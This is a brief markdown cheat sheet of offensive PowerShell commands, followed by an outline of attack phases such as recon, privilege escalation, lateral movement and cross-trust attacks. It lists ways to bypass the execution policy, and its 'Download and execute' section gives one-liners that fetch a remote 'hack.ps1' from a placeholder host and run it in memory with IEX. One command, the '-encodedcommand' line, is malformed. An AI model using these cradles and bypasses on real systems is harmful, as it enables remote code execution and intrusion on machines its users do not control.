## Powershell  basic help commands

`Get-Help`

`Get-Help process`

## Powershell Execution Policy bypass

`powershell -ExecutionPolicy bypass`

`powershell -c <cmd>`

`powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"`

## Powershell importing module / scripts

`Import-Module <module_path`

listing commands in the module

`Get-Command -Module <modulename>`

## Download and execute

`IEX (New-Object Net.WebClient).DownloadString ('http://ip/hack.ps1')`

`IEX (iwr 'http://ip/hack.ps1')`

Recon 
Domain Enum 
Local priv 
Admin Recon 
Lateral Movement (while being persistant) 
Domain 
Admin priv 
Cross Trust Attacks